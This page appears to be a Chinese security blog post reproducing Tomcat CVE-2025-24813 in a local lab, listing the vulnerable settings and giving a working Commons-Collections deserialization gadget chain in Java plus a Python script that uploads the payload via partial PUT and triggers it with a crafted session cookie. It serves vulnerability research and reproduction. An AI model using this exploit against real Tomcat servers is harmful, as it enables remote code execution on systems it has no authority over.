
<!DOCTYPE html>
<html lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>[Tomcat]CVE-2025-24813å¤ç°åŠåŸç†åˆ†æ | GSBP&#39;s Blog</title>
    <meta name="description"
        content="å‰è¨€
å‡ºäº†ä¸ªé€šå‘Šè¯´Tomcatæœ‰ä¸ªæ–°çš„cveï¼Œäºæ˜¯æ¥å°è¯•å¤ç°åˆ†æä¸€ä¸‹
é€šæŠ¥
å…³äºæ¼æ´çš„é€šæŠ¥ç»†èŠ‚å¦‚ä¸‹








ä¸€çœ‹åˆæ˜¯DefaultServletçš„putæ–¹æ³•ä¸Šå‡ºçš„æ´ï¼Œè¿™é‡Œæ¼æ´åˆ©ç”¨æœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ä¸ªæ˜¯ä¿¡æ¯æ³„æ¼å’Œç¯¡æ”¹ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯ååºåˆ—åŒ–RCEï¼Œè€Œä¸”è¦æ±‚çš„å‰ç½®é¡¹æœ‰ç‚¹å¤šï¼Œè¿™é‡Œç®€å•åˆ—å‡ºæ¥
ä¿¡æ¯æ³„æ¼/ç¯¡æ”¹


ReadOnlyä¸ºfalse


æ”¯æŒpartial PUTæ–¹æ³•


æ”»å‡»è€…çŸ¥é“æ•æ„Ÿæ–‡ä»¶çš„åç§°


å®‰å…¨æ•æ„Ÿæ–‡ä»¶çš„ä¸Šä¼ ç›®æ ‡ URL æ˜¯å…¬å¼€ä¸Šä¼ ç›®æ ‡ URL çš„å­ç›®å½•ï¼ˆï¼Ÿè¿™ä¸ªçœ‹ä¸æ‡‚ï¼Œä¹Ÿä¸çŸ¥é“å•¥æ„æ€ï¼‰


ååºåˆ—åŒ–RCE

ReadOnlyä¸ºfalse
æ”¯æŒpartial PUTæ–¹æ³•
æœåŠ¡å¼€å¯ä»¥æ–‡ä»¶ä¸ºå­˜å‚¨å½¢å¼çš„æŒä¹…åŒ–é“¾æ¥ï¼Œå¹¶ä¸”é‡‡ç”¨é»˜è®¤ä½ç½®
æœ‰èƒ½å¤Ÿå¼•èµ·ååºåˆ—åŒ–æ¼æ´çš„ä¾èµ–

ç¯å¢ƒæ­å»º
æˆ‘å‚è€ƒçš„è¿™ç¯‡æ–‡ç« æ­å»ºçš„ç¯å¢ƒ
https://juejin.cn/post/7331544684290228250
æ¥ä¸‹æ¥ä¿®æ”¹readonly
tomcatç›®å½•/conf/web.xml
    &lt;servlet&gt;
        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;debug&lt;/param-name&gt;
            &lt;param-value&gt;0&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;listings&lt;/param-name&gt;
            &lt;param-value&gt;false&lt;/param-value&gt;
        &lt;/init-param&gt;
      &lt;init-param&gt;
        &lt;param-name&gt;readonly&lt;/param-name&gt;
        &lt;param-value&gt;false&lt;/param-value&gt;
      &lt;/init-param&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
å¼€å¯æŒä¹…åŒ–é“¾æ¥æ–‡ä»¶æ¨¡å¼
tomcatç›®å½•/conf/context.xml
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the &#34;License&#34;); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an &#34;AS IS&#34; BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&gt;
&lt;!-- The contents of this file will be loaded for each web application --&gt;
&lt;Context&gt;

    &lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;
    &lt;!-- web application will be reloaded.                                   --&gt;
    &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;
    &lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;
    &lt;WatchedResource&gt;${catalina.base}/conf/web.xml&lt;/WatchedResource&gt;

    &lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;
    &lt;!--
    &lt;Manager pathname=&#34;&#34; /&gt;
    --&gt;
  &lt;Manager className=&#34;org.apache.catalina.session.PersistentManager&#34;
           debug=&#34;0&#34;
           saveOnRestart=&#34;false&#34;
           maxActiveSession=&#34;-1&#34;
           minIdleSwap=&#34;-1&#34;
           maxIdleSwap=&#34;-1&#34;
           maxIdleBackup=&#34;-1&#34;&gt;
    &lt;Store className=&#34;org.apache.catalina.session.FileStore&#34; directory=&#34;&#34;/&gt;
  &lt;/Manager&gt;
&lt;/Context&gt;
å¾€pom.xmlä¸‹å¡å…¥CCä¾èµ–">
    <link rel="canonical" href="http://localhost:1313/post/tomcatcve-2025-24813%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.4/css/bulma.min.css">
    
    <link rel="stylesheet" href="http://localhost:1313/scss/style.min.badf012c7f163854e3d9c3287a1df0863ae1974f62e123bbf1f2948b58ed39cf.css">

    <meta property="og:url" content="http://localhost:1313/post/tomcatcve-2025-24813%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">
  <meta property="og:site_name" content="GSBP&#39;s Blog">
  <meta property="og:title" content="[Tomcat]CVE-2025-24813å¤ç°åŠåŸç†åˆ†æ">
  <meta property="og:description" content="å‰è¨€ å‡ºäº†ä¸ªé€šå‘Šè¯´Tomcatæœ‰ä¸ªæ–°çš„cveï¼Œäºæ˜¯æ¥å°è¯•å¤ç°åˆ†æä¸€ä¸‹
é€šæŠ¥ å…³äºæ¼æ´çš„é€šæŠ¥ç»†èŠ‚å¦‚ä¸‹
ä¸€çœ‹åˆæ˜¯DefaultServletçš„putæ–¹æ³•ä¸Šå‡ºçš„æ´ï¼Œè¿™é‡Œæ¼æ´åˆ©ç”¨æœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ä¸ªæ˜¯ä¿¡æ¯æ³„æ¼å’Œç¯¡æ”¹ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯ååºåˆ—åŒ–RCEï¼Œè€Œä¸”è¦æ±‚çš„å‰ç½®é¡¹æœ‰ç‚¹å¤šï¼Œè¿™é‡Œç®€å•åˆ—å‡ºæ¥
ä¿¡æ¯æ³„æ¼/ç¯¡æ”¹ ReadOnlyä¸ºfalse
æ”¯æŒpartial PUTæ–¹æ³•
æ”»å‡»è€…çŸ¥é“æ•æ„Ÿæ–‡ä»¶çš„åç§°
å®‰å…¨æ•æ„Ÿæ–‡ä»¶çš„ä¸Šä¼ ç›®æ ‡ URL æ˜¯å…¬å¼€ä¸Šä¼ ç›®æ ‡ URL çš„å­ç›®å½•ï¼ˆï¼Ÿè¿™ä¸ªçœ‹ä¸æ‡‚ï¼Œä¹Ÿä¸çŸ¥é“å•¥æ„æ€ï¼‰
ååºåˆ—åŒ–RCE ReadOnlyä¸ºfalse æ”¯æŒpartial PUTæ–¹æ³• æœåŠ¡å¼€å¯ä»¥æ–‡ä»¶ä¸ºå­˜å‚¨å½¢å¼çš„æŒä¹…åŒ–é“¾æ¥ï¼Œå¹¶ä¸”é‡‡ç”¨é»˜è®¤ä½ç½® æœ‰èƒ½å¤Ÿå¼•èµ·ååºåˆ—åŒ–æ¼æ´çš„ä¾èµ– ç¯å¢ƒæ­å»º æˆ‘å‚è€ƒçš„è¿™ç¯‡æ–‡ç« æ­å»ºçš„ç¯å¢ƒ
https://juejin.cn/post/7331544684290228250
æ¥ä¸‹æ¥ä¿®æ”¹readonly
tomcatç›®å½•/conf/web.xml
&lt;servlet&gt;&lt;servlet-name&gt;default&lt;/servlet-name&gt;&lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;&lt;init-param&gt;&lt;param-name&gt;debug&lt;/param-name&gt;&lt;param-value&gt;0&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;&lt;param-name&gt;listings&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; å¼€å¯æŒä¹…åŒ–é“¾æ¥æ–‡ä»¶æ¨¡å¼
tomcatç›®å½•/conf/context.xml
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!--Licensed to the Apache Software Foundation (ASF) under one or morecontributor license agreements. See the NOTICE file distributed withthis work for additional information regarding copyright ownership.The ASF licenses this file to You under the Apache License, Version 2.0(the &#34;License&#34;); you may not use this file except in compliance withthe License. You may obtain a copy of the License athttp://www.apache.org/licenses/LICENSE-2.0Unless required by applicable law or agreed to in writing, softwaredistributed under the License is distributed on an &#34;AS IS&#34; BASIS,WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.See the License for the specific language governing permissions andlimitations under the License.--&gt;&lt;!-- The contents of this file will be loaded for each web application --&gt;&lt;Context&gt;&lt;!-- Default set of monitored resources. If one of these changes, the --&gt;&lt;!-- web application will be reloaded. --&gt;&lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;&lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;&lt;WatchedResource&gt;${catalina.base}/conf/web.xml&lt;/WatchedResource&gt;&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;&lt;!--&lt;Manager pathname=&#34;&#34; /&gt;--&gt;&lt;Manager className=&#34;org.apache.catalina.session.PersistentManager&#34;debug=&#34;0&#34;saveOnRestart=&#34;false&#34;maxActiveSession=&#34;-1&#34;minIdleSwap=&#34;-1&#34;maxIdleSwap=&#34;-1&#34;maxIdleBackup=&#34;-1&#34;&gt;&lt;Store className=&#34;org.apache.catalina.session.FileStore&#34; directory=&#34;&#34;/&gt;&lt;/Manager&gt;&lt;/Context&gt; å¾€pom.xmlä¸‹å¡å…¥CCä¾èµ–">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-03-12T18:00:00+08:00">
    <meta property="article:modified_time" content="2025-03-12T18:00:00+08:00">

    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="[Tomcat]CVE-2025-24813å¤ç°åŠåŸç†åˆ†æ">
  <meta name="twitter:description" content="å‰è¨€ å‡ºäº†ä¸ªé€šå‘Šè¯´Tomcatæœ‰ä¸ªæ–°çš„cveï¼Œäºæ˜¯æ¥å°è¯•å¤ç°åˆ†æä¸€ä¸‹
é€šæŠ¥ å…³äºæ¼æ´çš„é€šæŠ¥ç»†èŠ‚å¦‚ä¸‹
ä¸€çœ‹åˆæ˜¯DefaultServletçš„putæ–¹æ³•ä¸Šå‡ºçš„æ´ï¼Œè¿™é‡Œæ¼æ´åˆ©ç”¨æœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ä¸ªæ˜¯ä¿¡æ¯æ³„æ¼å’Œç¯¡æ”¹ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯ååºåˆ—åŒ–RCEï¼Œè€Œä¸”è¦æ±‚çš„å‰ç½®é¡¹æœ‰ç‚¹å¤šï¼Œè¿™é‡Œç®€å•åˆ—å‡ºæ¥
ä¿¡æ¯æ³„æ¼/ç¯¡æ”¹ ReadOnlyä¸ºfalse
æ”¯æŒpartial PUTæ–¹æ³•
æ”»å‡»è€…çŸ¥é“æ•æ„Ÿæ–‡ä»¶çš„åç§°
å®‰å…¨æ•æ„Ÿæ–‡ä»¶çš„ä¸Šä¼ ç›®æ ‡ URL æ˜¯å…¬å¼€ä¸Šä¼ ç›®æ ‡ URL çš„å­ç›®å½•ï¼ˆï¼Ÿè¿™ä¸ªçœ‹ä¸æ‡‚ï¼Œä¹Ÿä¸çŸ¥é“å•¥æ„æ€ï¼‰
ååºåˆ—åŒ–RCE ReadOnlyä¸ºfalse æ”¯æŒpartial PUTæ–¹æ³• æœåŠ¡å¼€å¯ä»¥æ–‡ä»¶ä¸ºå­˜å‚¨å½¢å¼çš„æŒä¹…åŒ–é“¾æ¥ï¼Œå¹¶ä¸”é‡‡ç”¨é»˜è®¤ä½ç½® æœ‰èƒ½å¤Ÿå¼•èµ·ååºåˆ—åŒ–æ¼æ´çš„ä¾èµ– ç¯å¢ƒæ­å»º æˆ‘å‚è€ƒçš„è¿™ç¯‡æ–‡ç« æ­å»ºçš„ç¯å¢ƒ
https://juejin.cn/post/7331544684290228250
æ¥ä¸‹æ¥ä¿®æ”¹readonly
tomcatç›®å½•/conf/web.xml
&lt;servlet&gt;&lt;servlet-name&gt;default&lt;/servlet-name&gt;&lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;&lt;init-param&gt;&lt;param-name&gt;debug&lt;/param-name&gt;&lt;param-value&gt;0&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;&lt;param-name&gt;listings&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; å¼€å¯æŒä¹…åŒ–é“¾æ¥æ–‡ä»¶æ¨¡å¼
tomcatç›®å½•/conf/context.xml
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!--Licensed to the Apache Software Foundation (ASF) under one or morecontributor license agreements. See the NOTICE file distributed withthis work for additional information regarding copyright ownership.The ASF licenses this file to You under the Apache License, Version 2.0(the &#34;License&#34;); you may not use this file except in compliance withthe License. You may obtain a copy of the License athttp://www.apache.org/licenses/LICENSE-2.0Unless required by applicable law or agreed to in writing, softwaredistributed under the License is distributed on an &#34;AS IS&#34; BASIS,WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.See the License for the specific language governing permissions andlimitations under the License.--&gt;&lt;!-- The contents of this file will be loaded for each web application --&gt;&lt;Context&gt;&lt;!-- Default set of monitored resources. If one of these changes, the --&gt;&lt;!-- web application will be reloaded. --&gt;&lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;&lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;&lt;WatchedResource&gt;${catalina.base}/conf/web.xml&lt;/WatchedResource&gt;&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;&lt;!--&lt;Manager pathname=&#34;&#34; /&gt;--&gt;&lt;Manager className=&#34;org.apache.catalina.session.PersistentManager&#34;debug=&#34;0&#34;saveOnRestart=&#34;false&#34;maxActiveSession=&#34;-1&#34;minIdleSwap=&#34;-1&#34;maxIdleSwap=&#34;-1&#34;maxIdleBackup=&#34;-1&#34;&gt;&lt;Store className=&#34;org.apache.catalina.session.FileStore&#34; directory=&#34;&#34;/&gt;&lt;/Manager&gt;&lt;/Context&gt; å¾€pom.xmlä¸‹å¡å…¥CCä¾èµ–">

    

</head>
<body><nav class="navbar is-light" role="navigation">
    <div class="container">
        <div class="navbar-brand">
            <a href="/" title="home" class="navbar-item">
                <span class="logo">
                    <h1>GSBP&#39;s Blog</h1>
                </span>
            </a>

            
            <a id="theme-toggle" class="theme-toggle" href="#">
                <img src="http://localhost:1313/svg/sun.svg" alt="sun icon" class="theme-icon" />
            </a>

            <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
            </a>
        </div>

        <div class="navbar-menu">
            <div class="navbar-start">
                
                <a href="/about" class="navbar-item">About</a>
                
                <a href="/post" class="navbar-item">Blog</a>
                
                <a href="/categories" class="navbar-item">Categories</a>
                
                <a href="/friend" class="navbar-item">Friends</a>
                
            </div>

        </div>
        <div class="search">
            <div id="fastSearch">
                <input id="searchInput" tabindex="0" placeholder="Search..">
                <ul id="searchResults">

                </ul>
            </div>
            <a id="search-btn" style="display: inline-block;" href="# ">
                <div class="icon-search"><svg class="search-svg" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></div>
            </a>
        </div>

        <script src="/js/fuse.min.js"></script> 
        <script src="/js/fastsearch.js"></script>

    </div>
</nav>

<script>
    
    document.addEventListener('DOMContentLoaded', function() {
        var burger = document.querySelector('.navbar-burger');
        burger.addEventListener('click', function() {
            burger.classList.toggle('is-active');
            document.querySelector('.navbar-menu').classList.toggle('is-active');
        });
    });

    
    function setTheme(theme) {
        let body = document.body;
        let themeIcon = document.querySelector(".theme-icon");
        if (theme === "dark") {
            body.classList.add("dark-mode");
            themeIcon.src = "http:\/\/localhost:1313\/svg/moon.svg";
            themeIcon.alt = "moon icon";
        } else {
            body.classList.remove("dark-mode");
            themeIcon.src = "http:\/\/localhost:1313\/svg/sun.svg";
            themeIcon.alt = "sun icon";
        }
        
        localStorage.setItem("theme", theme);
    }

    
    let theme = localStorage.getItem("theme") || "light";
    const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    if (isDarkMode) {
        
        setTheme('dark');

    } else {
        
        setTheme('light');
    }
    setTheme(theme);

    
    document.getElementById("theme-toggle").addEventListener("click", function() {
        if (theme === "light") {
            theme = "dark";
        } else {
            theme = "light";
        }
        setTheme(theme);
    });



</script>

</header><main>
<div class="single-container">
    <div class="archive">
        <h1 class="title is-1">[Tomcat]CVE-2025-24813å¤ç°åŠåŸç†åˆ†æ</h1>
        <div class="title subtitle heading is-6">
            <div class="author-info columns is-vcentered">
                <div class="column">
                    <div class="columns is-vcentered is-mobile">
                        
                        <div class="column is-narrow">
                            <img src="/img/GSBP.jpg" class="author-image">
                        </div>
                        
                        <div class="column">
                            <p>GSBP</p>
                            <p><time>March 12, 2025</time>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="small-categories-container">
                    <a href="/categories/java%E5%AE%89%E5%85%A8">Javaå®‰å…¨</a>, <a href="/categories/cve">CVE</a>
                </div>
            </div>
        </div>
        <div class="content article-content">
            <div class="toc-container">
                
    <div class="post-toc">
        
            <aside>
                <button id="tocButton" ><h4 id="contents" style="margin-left: 1vw;color:rgb(96, 134, 180);margin-bottom: 0;">CONTENTS</h4></button>
                <div id="hide"><nav id="TableOfContents">
  <ul>
    <li><a href="#å‰è¨€">å‰è¨€</a></li>
    <li><a href="#é€šæŠ¥">é€šæŠ¥</a>
      <ul>
        <li><a href="#ä¿¡æ¯æ³„æ¼ç¯¡æ”¹">ä¿¡æ¯æ³„æ¼/ç¯¡æ”¹</a></li>
        <li><a href="#ååºåˆ—åŒ–rce">ååºåˆ—åŒ–RCE</a></li>
      </ul>
    </li>
    <li><a href="#ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</a></li>
    <li><a href="#æ¼æ´å¤ç°">æ¼æ´å¤ç°</a></li>
    <li><a href="#åŸç†åˆ†æ">åŸç†åˆ†æ</a>
      <ul>
        <li><a href="#å…¶ä¸€">å…¶ä¸€</a></li>
        <li><a href="#å…¶äºŒ">å…¶äºŒ</a></li>
        <li><a href="#ä¿¡æ¯æ³„éœ²ç¯¡æ”¹">ä¿¡æ¯æ³„éœ²&amp;ç¯¡æ”¹</a></li>
      </ul>
    </li>
    <li><a href="#ç»“å°¾">ç»“å°¾</a></li>
  </ul>
</nav></div>
            </aside>
        
    </div><script>
    
        let button = document.getElementById('tocButton');
        let hide = document.getElementById("hide");
        let contents=document.getElementById("contents");
        button.addEventListener("click", function() {
        if (hide.style.display!='block') {
            hide.style.display='block'
        } else {
            hide.style.display='none'
            contents.style.color='rgb(96, 134, 180)'
        }
        });
    




</script>
            </div>
            <h2 id="å‰è¨€">å‰è¨€</h2>
<p>å‡ºäº†ä¸ªé€šå‘Šè¯´Tomcatæœ‰ä¸ªæ–°çš„cveï¼Œäºæ˜¯æ¥å°è¯•å¤ç°åˆ†æä¸€ä¸‹</p>
<h2 id="é€šæŠ¥">é€šæŠ¥</h2>
<p>å…³äºæ¼æ´çš„é€šæŠ¥ç»†èŠ‚å¦‚ä¸‹</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312143659450.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312143659450.png" alt="image-20250312143659450"  />
</a>
</div>

</p>
<p>ä¸€çœ‹åˆæ˜¯DefaultServletçš„putæ–¹æ³•ä¸Šå‡ºçš„æ´ï¼Œè¿™é‡Œæ¼æ´åˆ©ç”¨æœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ä¸ªæ˜¯ä¿¡æ¯æ³„æ¼å’Œç¯¡æ”¹ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯ååºåˆ—åŒ–RCEï¼Œè€Œä¸”è¦æ±‚çš„å‰ç½®é¡¹æœ‰ç‚¹å¤šï¼Œè¿™é‡Œç®€å•åˆ—å‡ºæ¥</p>
<h3 id="ä¿¡æ¯æ³„æ¼ç¯¡æ”¹">ä¿¡æ¯æ³„æ¼/ç¯¡æ”¹</h3>
<ul>
<li>
<p>ReadOnlyä¸ºfalse</p>
</li>
<li>
<p>æ”¯æŒpartial PUTæ–¹æ³•</p>
</li>
<li>
<p>æ”»å‡»è€…çŸ¥é“æ•æ„Ÿæ–‡ä»¶çš„åç§°</p>
</li>
<li>
<p>å®‰å…¨æ•æ„Ÿæ–‡ä»¶çš„ä¸Šä¼ ç›®æ ‡ URL æ˜¯å…¬å¼€ä¸Šä¼ ç›®æ ‡ URL çš„å­ç›®å½•ï¼ˆï¼Ÿè¿™ä¸ªçœ‹ä¸æ‡‚ï¼Œä¹Ÿä¸çŸ¥é“å•¥æ„æ€ï¼‰</p>
</li>
</ul>
<h3 id="ååºåˆ—åŒ–rce">ååºåˆ—åŒ–RCE</h3>
<ul>
<li>ReadOnlyä¸ºfalse</li>
<li>æ”¯æŒpartial PUTæ–¹æ³•</li>
<li>æœåŠ¡å¼€å¯ä»¥æ–‡ä»¶ä¸ºå­˜å‚¨å½¢å¼çš„æŒä¹…åŒ–é“¾æ¥ï¼Œå¹¶ä¸”é‡‡ç”¨é»˜è®¤ä½ç½®</li>
<li>æœ‰èƒ½å¤Ÿå¼•èµ·ååºåˆ—åŒ–æ¼æ´çš„ä¾èµ–</li>
</ul>
<h2 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h2>
<p>æˆ‘å‚è€ƒçš„è¿™ç¯‡æ–‡ç« æ­å»ºçš„ç¯å¢ƒ</p>
<p><a href="https://juejin.cn/post/7331544684290228250">https://juejin.cn/post/7331544684290228250</a></p>
<p>æ¥ä¸‹æ¥ä¿®æ”¹readonly</p>
<p><code>tomcatç›®å½•/conf/web.xml</code></p>
<pre tabindex="0"><code>    &lt;servlet&gt;
        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;debug&lt;/param-name&gt;
            &lt;param-value&gt;0&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;listings&lt;/param-name&gt;
            &lt;param-value&gt;false&lt;/param-value&gt;
        &lt;/init-param&gt;
      &lt;init-param&gt;
        &lt;param-name&gt;readonly&lt;/param-name&gt;
        &lt;param-value&gt;false&lt;/param-value&gt;
      &lt;/init-param&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
</code></pre><p>å¼€å¯æŒä¹…åŒ–é“¾æ¥æ–‡ä»¶æ¨¡å¼</p>
<p><code>tomcatç›®å½•/conf/context.xml</code></p>
<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the &#34;License&#34;); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an &#34;AS IS&#34; BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&gt;
&lt;!-- The contents of this file will be loaded for each web application --&gt;
&lt;Context&gt;

    &lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;
    &lt;!-- web application will be reloaded.                                   --&gt;
    &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;
    &lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;
    &lt;WatchedResource&gt;${catalina.base}/conf/web.xml&lt;/WatchedResource&gt;

    &lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;
    &lt;!--
    &lt;Manager pathname=&#34;&#34; /&gt;
    --&gt;
  &lt;Manager className=&#34;org.apache.catalina.session.PersistentManager&#34;
           debug=&#34;0&#34;
           saveOnRestart=&#34;false&#34;
           maxActiveSession=&#34;-1&#34;
           minIdleSwap=&#34;-1&#34;
           maxIdleSwap=&#34;-1&#34;
           maxIdleBackup=&#34;-1&#34;&gt;
    &lt;Store className=&#34;org.apache.catalina.session.FileStore&#34; directory=&#34;&#34;/&gt;
  &lt;/Manager&gt;
&lt;/Context&gt;
</code></pre><p>å¾€pom.xmlä¸‹å¡å…¥CCä¾èµ–</p>
<pre tabindex="0"><code>    &lt;dependency&gt;
      &lt;groupId&gt;commons-collections&lt;/groupId&gt;
      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
      &lt;version&gt;3.2.1&lt;/version&gt;
    &lt;/dependency&gt;
</code></pre><h2 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h2>
<p>å¼€å¯æœåŠ¡</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312145524530.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312145524530.png" alt="image-20250312145524530"  />
</a>
</div>

</p>
<p>ç„¶åè·‘ä¸ªccçš„poc</p>
<pre tabindex="0"><code>package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.util.*;
import java.lang.reflect.*;

public class Main {

    public static void main(String[] args) throws Exception {
        String cmd=&#34;open -a calculator&#34;;
        Transformer[] transformers =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&#34;getMethod&#34;,new Class[]{String.class,Class[].class},new Object[]{&#34;getRuntime&#34;,new Class[0]}),
                new InvokerTransformer(&#34;invoke&#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);

        HashMap hsmap=new HashMap();
        hsmap.put(&#34;value&#34;,&#34;test&#34;);

        Map transformedMap=TransformedMap.decorate(hsmap,null,chainedTransformer);

        Class aclass=Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);
        Constructor constructor=aclass.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object handler = constructor.newInstance(Target.class,transformedMap);

        FileOutputStream bao=new FileOutputStream(&#34;ser&#34;);
        ObjectOutputStream oos=new ObjectOutputStream(bao);
        oos.writeObject(handler);
        oos.close();

    }

}
</code></pre><p>å¾—åˆ°seræ–‡ä»¶ä¹‹åå†è·‘ä¸‹é¢è„šæœ¬</p>
<pre tabindex="0"><code>import requests
data=open(&#34;ser&#34;,&#34;rb&#34;).read()
headers={&#34;Content-Range&#34;:&#34;bytes 0-10000/67589&#34;}
url=&#34;http://127.0.0.1:8081/evil/session&#34;
requests.put(url,headers=headers,data=data)
requests.get(url,headers={&#34;Cookie&#34;:&#34;JSESSIONID=.evil&#34;})
</code></pre><p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312145744884.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312145744884.png" alt="image-20250312145744884"  />
</a>
